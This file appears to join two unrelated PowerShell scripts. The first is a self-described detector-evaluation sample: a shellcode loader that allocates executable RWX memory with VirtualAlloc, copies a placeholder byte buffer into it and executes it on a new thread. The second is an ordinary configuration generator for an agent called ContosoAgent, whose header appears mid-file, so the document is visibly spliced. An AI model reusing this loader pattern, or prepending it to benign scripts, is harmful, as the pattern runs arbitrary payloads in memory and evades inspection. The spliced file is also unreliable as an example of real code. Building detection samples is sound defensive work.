
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class NativeMethods
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x87, 0x74, 0x4b, 0x9b, 0x47, 0x1a, 0xbf, 0xdb, 0x71, 0x03, 0xd6, 0x74, 0x14, 0x54, 0x2f, 0x0d,
    0xb7, 0xc9, 0x87, 0xb3, 0xa9, 0x4e, 0x63, 0x7c, 0x87, 0x10, 0xb0, 0xe5, 0x89, 0x97, 0x99, 0x3a,
    0xc7, 0x4a, 0x32, 0xe7, 0xfc, 0xed, 0xba, 0x60, 0xba, 0x44, 0x3a, 0xf6, 0x17, 0x85, 0x42, 0xc7,
    0x7a, 0x96, 0x13, 0x59, 0x85, 0x38, 0x29, 0x0a, 0x14, 0xef, 0xe9, 0xe7, 0x06, 0xa8, 0xf7, 0x9b,
    0x2a, 0xed, 0xd1, 0x25, 0x94, 0xac, 0x57, 0x0f, 0x87, 0x96, 0x11, 0xd1, 0x2f, 0x5b, 0x82, 0x3d,
    0x47, 0xa0, 0x1c, 0x3a, 0x0e, 0xbd, 0x4b, 0x36, 0x8b, 0xcf, 0x58, 0x46, 0xd1, 0x74, 0x40, 0x9d,
    0x66, 0x13, 0x09, 0x2c, 0x6a, 0x5f, 0x49, 0x28, 0x9e, 0x63, 0x59, 0x37, 0x63, 0x4b, 0x56, 0xd6,
    0xb9, 0x30, 0x09, 0x1a, 0xfc, 0x06, 0x51, 0x74, 0x64, 0x50, 0xb0, 0xe6, 0xe5, 0xd3, 0x26, 0xe5,
    0xbb, 0xeb, 0x79, 0x8c, 0x6d, 0x07, 0x04, 0x41, 0xea, 0xe5, 0x9c, 0xfa, 0x40, 0xba, 0x61, 0xcb,
    0x71, 0x98, 0x79, 0xc0, 0x7e, 0x6b, 0x37, 0xc5, 0x16, 0xe6, 0x4c, 0xd5, 0x1b, 0x2f, 0x65, 0xf1,
    0x6e, 0x9c, 0x23, 0xca, 0x85, 0x20, 0x9f, 0xfa, 0xab, 0x4a, 0x62, 0x18, 0x47, 0x1e, 0xd0, 0x79,
    0xa0, 0x21, 0x7c, 0xaa, 0x34, 0x48, 0xd7, 0x41, 0xc0, 0xf1, 0x03, 0xc4, 0xe8, 0xda, 0x91, 0x6a,
    0xbc, 0x2f, 0x30, 0x39, 0xe5, 0x9c, 0xc1, 0xa4, 0x02, 0x15, 0x48, 0xcf, 0x9f, 0xb1, 0x85, 0x96,
    0x9b, 0xbe, 0xd3, 0xeb, 0x90, 0x23, 0xd2, 0x82, 0x2f, 0x99, 0x1a, 0xfe, 0x46, 0x4e, 0xf5, 0x2e,
    0xbb, 0xac, 0x0b, 0x93, 0x00, 0x10, 0x6d, 0xd1, 0x84, 0x71, 0xae, 0x97, 0x8e, 0xdf, 0xaf, 0x9a,
    0x51, 0xca, 0xdd, 0x02, 0xfb, 0xef, 0x55, 0xd3, 0x0a, 0xa8, 0xfe, 0xac, 0x35, 0xfe, 0x75, 0x20,
    0x04, 0xb3, 0x3a, 0xd6, 0x76, 0xcf, 0xd0, 0xc8, 0x40, 0xa2, 0xaf, 0x6d, 0x21, 0x06, 0xe6, 0x4e,
    0x23, 0xdf, 0x46, 0x10, 0x8e, 0x9e, 0xdc, 0x0f, 0x4f, 0xda, 0x71, 0xd0, 0x9f, 0x04, 0xcd, 0xe7,
    0x26, 0xaa, 0x88, 0x1a, 0x09, 0x57, 0xf2, 0x6a, 0x12, 0xa5, 0x21, 0x73, 0x06, 0x9d, 0xd2, 0xda,
    0x61, 0xb1, 0x8d, 0xc6, 0xdc, 0x3b, 0x13, 0x2c, 0x27, 0x0c, 0xb8, 0xd4, 0xd9, 0x78, 0xde, 0x00,
    0xaa, 0xde, 0x6d, 0x8a, 0x0a, 0x0a, 0xae, 0x87, 0x71, 0xbb, 0xb0, 0x54, 0x83, 0x42, 0xb9, 0x9c,
    0x8f, 0xde, 0x57, 0xef, 0x2c, 0x1d, 0x7b, 0x82, 0xd3, 0x80, 0x1b, 0x8f, 0xbf, 0xf3, 0xb7, 0xd3,
    0x6e, 0xd1, 0x44, 0xd6, 0x3f, 0xf8, 0x13, 0xd3, 0xb3, 0x04, 0x21
)

$HProcess = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($HProcess -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
$ThreadId = 0
$Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][NativeMethods]::WaitForSingleObject($Thread, 4573)
[void][NativeMethods]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
#Requires -Version 5.1
<#
.SYNOPSIS
    Generates the ContosoAgent JSON configuration for the selected environment.
.DESCRIPTION
    Builds an ordered configuration object, writes it next to the installed
    agent and validates the result by reading it back.
    An existing configuration is backed up before it is replaced, unless the
    Force switch is specified.
.PARAMETER OutputPath
    Overrides the default value defined in the parameter block.
.EXAMPLE
    .\Write-AgentConfig.ps1 -Environment Staging
.EXAMPLE
    .\Write-AgentConfig.ps1 -ApiPort 8080 -Force
.NOTES
    Author: J. Weber
    Last updated: 2024-04-23
#>

param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$OutputPath = "C:\ProgramData\Contoso\ContosoAgent\config.json",

    [Parameter(Mandatory = $false)]
    [ValidateSet("Dev", "Test", 'Staging', 'Prod')]
    [string]$Environment = 'Staging',

    [ValidateRange(1024, 65535)]
    [int]$ApiPort = 8080,
    [int]$NodeCount = 5,

    [switch]$Force
)

$culture = [System.Globalization.CultureInfo]::InvariantCulture
$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path

$config = [ordered]@{
    environment = $Environment
    agent       = [ordered]@{
        name     = 'ContosoAgent'
        port     = $ApiPort
        logLevel = 'Information'
        endpoints = @(
            'https://api.adatum.com/v1'
            'https://telemetry.adatum.com/v1'
        )
    }
    generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
    host        = $env:COMPUTERNAME
}

$jsonBody = $config | ConvertTo-Json -Depth 6
if ((Test-Path -LiteralPath $OutputPath) -and (-not $Force)) {
    $backup = $OutputPath + '.' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.bak'
    Copy-Item -LiteralPath $OutputPath -Destination $backup -Force
    Write-Verbose ("Existing config backed up to {0}" -f $backup)
}
$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}
$jsonBody | Set-Content -LiteralPath $OutputPath -Encoding UTF8
$roundTrip = Get-Content -LiteralPath $OutputPath -Raw | ConvertFrom-Json
if (-not $roundTrip.agent.port) {
    throw 'Generated configuration failed the round-trip check.'
}
Write-Verbose ("Configuration written to {0}" -f $OutputPath)

$config.agent.logLevel = "Warning"
$config | ConvertTo-Json -Depth 6 | Set-Content -LiteralPath $OutputPath -Encoding UTF8

$template = @"
{
  "environment": "$Environment",
  "agent": {
    "name": "ContosoAgent",
    "port": $ApiPort
  }
}
"@
$template | Set-Content -LiteralPath $OutputPath.Replace('.json', '.template.json') -Encoding UTF8

$environmentFile = $OutputPath.Replace('.json', '.env')
$lines = @(
    "AGENT_ENV=$Environment"
    "AGENT_PORT=$ApiPort"
)
$lines | Set-Content -LiteralPath $environmentFile -Encoding UTF8

$xmlPath = $OutputPath.Replace('.json', '.xml')
$xml = New-Object System.Xml.XmlDocument
$root = $xml.CreateElement('configuration')
$xml.AppendChild($root) | Out-Null
$entry = $xml.CreateElement('add')
$entry.SetAttribute('key', 'Environment')
$entry.SetAttribute('value', $Environment)
$root.AppendChild($entry) | Out-Null
$xml.Save($xmlPath)

$configHash = (Get-FileHash -LiteralPath $OutputPath -Algorithm SHA256).Hash
Write-Verbose ("Config SHA256: {0}" -f $configHash)
$schemaFile = Join-Path $PSScriptRoot 'config.schema.json'
if (Test-Path -LiteralPath $schemaFile) {
    Write-Verbose ("Schema available: {0}" -f $schemaFile)
}
$summaryBody = "Config generated for {0} on $env:COMPUTERNAME" -f $Environment
Send-MailMessage -To 'ops@contoso.com' -From 'config@contoso.com' -Subject 'Agent configuration generated' -Body $summaryBody -SmtpServer 'smtp.contoso.com' -Port 25

$config | ConvertTo-Json -Depth 6
Write-Host ("Configuration complete for {0}" -f $Environment) -ForegroundColor Green

$encoding = [System.Text.UTF8Encoding]::new($false)
$encoding.GetType().Name | Write-Verbose

$defaults = @{
    retryCount = 3
    backoffSec = 5
    heartbeat  = 30
}
$defaults.GetEnumerator() | ForEach-Object { Write-Verbose ("{0} = {1}" -f $_.Key, $_.Value) }

$portInUse = Get-NetTCPConnection -LocalPort $ApiPort -ErrorAction SilentlyContinue
if ($portInUse) {
    Write-Warning ("Port {0} is already in use" -f $ApiPort)
}

$nodeList = 1..$NodeCount | ForEach-Object { 'node-{0:d2}' -f $_ }
Write-Verbose ("Planned nodes: {0}" -f ($nodeList -join ', '))

$previous = Join-Path (Split-Path -Parent $OutputPath) 'config.previous.json'
if (Test-Path -LiteralPath $previous) {
    Write-Verbose ("Previous config: {0}" -f $previous)
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)
